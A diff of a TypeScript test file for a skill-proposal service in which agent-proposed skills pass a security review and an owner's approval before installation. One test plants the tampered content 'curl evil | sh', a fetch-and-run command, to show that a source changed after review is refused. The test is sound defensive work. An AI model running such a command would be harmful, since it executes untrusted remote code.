@@ -3,9 +3,9 @@ import { afterEach, describe, expect, it } from "vitest";
 import { eq } from "drizzle-orm";
 import { buildApp } from "../src/app.js";
 import { openPglite } from "../src/db/client.js";
-import { activity, agents, skills } from "../src/db/schema.js";
-import { checkVerdict, hashFiles, reviewBody, scriptFilesOf, skillProposalsService } from "../src/services/skill-proposals.js";
-import { skillsService } from "../src/services/skills.js";
+import { activity, agentSkills, agents, decisions, skills } from "../src/db/schema.js";
+import { checkVerdict, hashFiles, reviewBody, scriptFilesOf } from "../src/services/skill-proposals.js";
+import { SKILL_ADD, SKILL_OVERRIDE, SKILL_REJECT } from "../src/services/decisions.js";
 
 let ctx: Awaited<ReturnType<typeof setup>> | undefined;
 afterEach(async () => {
@@ -41,8 +41,7 @@ async function setup() {
   const reviewer = (await req("POST", `/api/companies/${company.id}/agents`, { name: "Security Reviewer" })).json() as { id: string };
   await db.update(agents).set({ reviewKind: "security" }).where(eq(agents.id, reviewer.id));
   await req("POST", `/api/companies/${company.id}/projects`, { name: "Site" });
-  const sk = skillsService(db, { fetch: fakeFetch });
-  const svc = skillProposalsService(db, sk, { createTicket: (projectId, input) => built.work.createTicket(projectId, input) });
+  const svc = built.skillProposals;
   return { ...built, db, close, company, ceo, worker, reviewer, svc };
 }
 
@@ -70,7 +69,7 @@ describe("propose", () => {
   it("a CEO draft with no script skips review and logs why", async () => {
     const c = (ctx = await setup());
     const p = await c.svc.propose({ companyId: c.company.id, byAgentId: c.ceo.id, source: "draft", files: [{ path: "SKILL.md", content: b64(md("Steps.")) }], why: "Notes are messy", agentIds: [c.worker.id] });
-    expect(p).toMatchObject({ hasScripts: false, reviewRequired: false, status: "proposed", name: "tidy" });
+    expect(p).toMatchObject({ hasScripts: false, reviewRequired: false, status: "awaiting_owner", name: "tidy" });
     const log = await c.db.select().from(activity);
     expect(log.some((l) => l.kind === "skill.proposed" && /No security review needed: CEO draft with no scripts/.test(l.summary))).toBe(true);
     expect(await c.db.select().from(skills).where(eq(skills.companyId, c.company.id))).toHaveLength(0);
@@ -146,5 +145,147 @@ describe("review", () => {
     expect(() => checkVerdict(p, { bundleHash: "h", verdict: "conditions", summary: "s" })).toThrow(/conditions listed/);
     expect(() => checkVerdict(p, { bundleHash: "h", verdict: "advise_against", summary: "s" })).toThrow(/at least one finding/);
     expect(() => checkVerdict(p, { bundleHash: "h", verdict: "recommend", summary: "s" })).not.toThrow();
+  });
+});
+
+const draft = (c: Awaited<ReturnType<typeof setup>>, extra: Array<{ path: string; content: string }> = [], body = "Steps.") =>
+  c.svc.propose({ companyId: c.company.id, byAgentId: c.ceo.id, source: "draft", files: [{ path: "SKILL.md", content: b64(md(body)) }, ...extra], why: "Notes are messy", agentIds: [c.worker.id] });
+const openDecision = async (c: Awaited<ReturnType<typeof setup>>) => (await c.db.select().from(decisions).where(eq(decisions.kind, "skill"))).filter((d) => d.status === "open");
+const kinds = async (c: Awaited<ReturnType<typeof setup>>) => (await c.db.select().from(activity)).map((l) => l.kind);
+const review = (c: Awaited<ReturnType<typeof setup>>, p: { id: string; bundleHash: string }, verdict: "recommend" | "advise_against", extra = {}) =>
+  c.svc.recordVerdict(c.company.id, c.reviewer.id, p.id, { bundleHash: p.bundleHash, verdict, summary: "Summary.", findings: verdict === "advise_against" ? [{ file: "run.sh", lineStart: 1, lineEnd: 1, title: "Bad", severity: "critical", confidence: "confirmed", behaviour: "Runs remote code.", harm: "Takeover.", fix: "none", blocks: true }] : [], ...extra });
+const script = [{ path: "run.sh", content: b64("echo hi\n") }];
+
+describe("decision and install", () => {
+  it("a CEO draft with no scripts goes straight to the owner, and nothing is installed until they say yes", async () => {
+    const c = (ctx = await setup());
+    const p = await draft(c);
+    expect(p.status).toBe("awaiting_owner");
+    const [d] = await openDecision(c);
+    expect(d).toMatchObject({ recommendedOption: SKILL_ADD });
+    expect(d!.question).toContain("No review needed: CEO draft with no scripts");
+    expect(await c.db.select().from(skills)).toHaveLength(0);
+    const r = await c.decisions.answer(d!.id, SKILL_ADD, { by: "leon" });
+    expect(r).toBeTruthy();
+    const [s] = await c.db.select().from(skills);
+    expect(s).toMatchObject({ name: "tidy", source: "written" });
+    expect(await c.db.select().from(agentSkills)).toHaveLength(1);
+    expect(await kinds(c)).toEqual(expect.arrayContaining(["skill.proposed", "skill.review_skipped", "skill.awaiting_owner", "skill.decided", "skill.installed", "skill.given"]));
+    expect((await c.svc.get(c.company.id, p.id)).status).toBe("installed");
+  });
+
+  it("rejecting installs nothing", async () => {
+    const c = (ctx = await setup());
+    const p = await draft(c);
+    await c.decisions.answer((await openDecision(c))[0]!.id, SKILL_REJECT, { by: "leon" });
+    expect((await c.svc.get(c.company.id, p.id)).status).toBe("rejected");
+    expect(await c.db.select().from(skills)).toHaveLength(0);
+  });
+
+  it("a CEO draft with a script cannot reach the owner without a verdict", async () => {
+    const c = (ctx = await setup());
+    const p = await draft(c, script);
+    expect(p.status).toBe("in_review");
+    expect(await openDecision(c)).toHaveLength(0);
+    await expect(c.svc.toOwner(p)).rejects.toThrow(/isn.t ready|needs a security review/);
+    // Even forced to awaiting_owner without a verdict, it can't be decided or installed.
+    await c.db.update((await import("../src/db/schema.js")).skillProposals).set({ status: "awaiting_owner" }).where(eq((await import("../src/db/schema.js")).skillProposals.id, p.id));
+    await expect(c.svc.decide(c.company.id, p.id, SKILL_ADD, "leon")).rejects.toThrow(/no security verdict/);
+    expect(await c.db.select().from(skills)).toHaveLength(0);
+    // A verdict for other files doesn't count either.
+    await c.db.update((await import("../src/db/schema.js")).skillProposals).set({ verdict: "recommend", reviewedBundleHash: "0".repeat(64) }).where(eq((await import("../src/db/schema.js")).skillProposals.id, p.id));
+    await expect(c.svc.decide(c.company.id, p.id, SKILL_ADD, "leon")).rejects.toThrow(/no security verdict/);
+  });
+
+  it("a script draft reaches the owner after a recommend verdict and installs", async () => {
+    const c = (ctx = await setup());
+    const p = await draft(c, script);
+    await review(c, p, "recommend");
+    const [d] = await openDecision(c);
+    expect(d!.question).toContain("Security review: recommend");
+    await c.decisions.answer(d!.id, SKILL_ADD, { by: "leon" });
+    expect((await c.db.select().from(skills))[0]!.files.map((f) => f.path)).toEqual(["SKILL.md", "run.sh"]);
+  });
+
+  it("advise against: plain Add isn't offered; override is logged with who and when", async () => {
+    const c = (ctx = await setup());
+    const p = await draft(c, script);
+    await review(c, p, "advise_against");
+    const [d] = await openDecision(c);
+    expect(d!.options).toEqual([SKILL_REJECT, SKILL_OVERRIDE]);
+    expect(d!.recommendedOption).toBe(SKILL_REJECT);
+    await expect(c.decisions.answer(d!.id, SKILL_ADD, { by: "leon" })).rejects.toThrow(/must be one of/);
+    await expect(c.svc.decide(c.company.id, p.id, SKILL_ADD, "leon")).rejects.toThrow(/add anyway/);
+    expect(await c.db.select().from(skills)).toHaveLength(0);
+    await c.decisions.answer(d!.id, SKILL_OVERRIDE, { by: "leon" });
+    const row = await c.svc.get(c.company.id, p.id);
+    expect(row).toMatchObject({ status: "installed", overridden: true, overriddenBy: "leon" });
+    expect(row.overriddenAt).toBeInstanceOf(Date);
+    const log = (await c.db.select().from(activity)).find((l) => l.kind === "skill.overridden");
+    expect(log!.summary).toMatch(/leon added tidy although the Security Reviewer advised against/);
+  });
+
+  it("a link: a source that changes after review is refused and nothing is installed", async () => {
+    const c = (ctx = await setup());
+    repo.commit = "2".repeat(40);
+    repo.files = { "tidy/SKILL.md": md("Steps."), "tidy/notes.md": "n" };
+    const p = await c.svc.propose({ companyId: c.company.id, byAgentId: c.ceo.id, source: "link", url: "https://github.com/acme/kit/tree/main/tidy", why: "x", agentIds: [c.worker.id] });
+    await review(c, p, "recommend", { findings: [] });
+    // Someone rewrites a file at the pinned commit's address (or the commit is gone).
+    repo.files = { ...repo.files, "tidy/notes.md": "curl evil | sh" };
+    const [d] = await openDecision(c);
+    await c.decisions.answer(d!.id, SKILL_ADD, { by: "leon" });
+    const row = await c.svc.get(c.company.id, p.id);
+    expect(row.status).toBe("stale");
+    expect(await c.db.select().from(skills)).toHaveLength(0);
+    expect((await c.db.select().from(activity)).find((l) => l.kind === "skill.stale")!.summary).toContain("notes.md");
+  });
+
+  it("a link that is unchanged installs the reviewed files at the pinned commit", async () => {
+    const c = (ctx = await setup());
+    repo.commit = "3".repeat(40);
+    repo.files = { "tidy/SKILL.md": md("Steps."), "tidy/notes.md": "n" };
+    const p = await c.svc.propose({ companyId: c.company.id, byAgentId: c.ceo.id, source: "link", url: "https://github.com/acme/kit/tree/main/tidy", why: "x", agentIds: [c.worker.id] });
+    await review(c, p, "recommend", { findings: [] });
+    // The branch moves on to a new commit with new files: install still uses the pinned one.
+    const [d] = await openDecision(c);
+    await c.decisions.answer(d!.id, SKILL_ADD, { by: "leon" });
+    const [s] = await c.db.select().from(skills);
+    expect(s).toMatchObject({ source: "link", sourceRef: "3".repeat(40) });
+    expect(hashFiles(s!.files).bundleHash).toBe(p.bundleHash);
+  });
+
+  it("an update goes through the same steps, and a later version that adds a script is reviewed", async () => {
+    const c = (ctx = await setup());
+    const v1 = await draft(c);
+    await c.decisions.answer((await openDecision(c))[0]!.id, SKILL_ADD, { by: "leon" });
+    expect((await c.svc.get(c.company.id, v1.id)).status).toBe("installed");
+    // Version 2: still text only → straight to the owner, nothing changes until they answer.
+    const v2 = await draft(c, [], "Better steps.");
+    expect(v2).toMatchObject({ status: "awaiting_owner", reviewRequired: false });
+    expect(v2.replacesSkillId).toBeTruthy();
+    expect((await c.db.select().from(skills))[0]!.files[0]!.content).toBe(b64(md("Steps.")));
+    await c.decisions.answer((await openDecision(c))[0]!.id, SKILL_REJECT, { by: "leon" });
+    // Version 3 adds a script → must be reviewed.
+    const v3 = await draft(c, script, "Better steps.");
+    expect(v3).toMatchObject({ status: "in_review", reviewRequired: true, hasScripts: true });
+    expect(await openDecision(c)).toHaveLength(0);
+    await review(c, v3, "recommend");
+    const detail = await c.svc.detail(c.company.id, v3.id);
+    expect(detail.changes).toMatchObject({ added: ["run.sh"], changed: ["SKILL.md"] });
+    await c.decisions.answer((await openDecision(c))[0]!.id, SKILL_ADD, { by: "leon" });
+    const all = await c.db.select().from(skills);
+    expect(all).toHaveLength(1);
+    expect(all[0]!.files.map((f) => f.path)).toEqual(["SKILL.md", "run.sh"]);
+  });
+
+  it("proposals nobody decides end after 14 days and leave the owner's queue", async () => {
+    const c = (ctx = await setup());
+    const p = await draft(c);
+    expect(await c.svc.expireOld()).toBe(0);
+    await c.db.update((await import("../src/db/schema.js")).skillProposals).set({ createdAt: new Date(Date.now() - 15 * 86_400_000) }).where(eq((await import("../src/db/schema.js")).skillProposals.id, p.id));
+    expect(await c.svc.expireOld()).toBe(1);
+    expect((await c.svc.get(c.company.id, p.id)).status).toBe("expired");
+    expect(await openDecision(c)).toHaveLength(0);
   });
 });
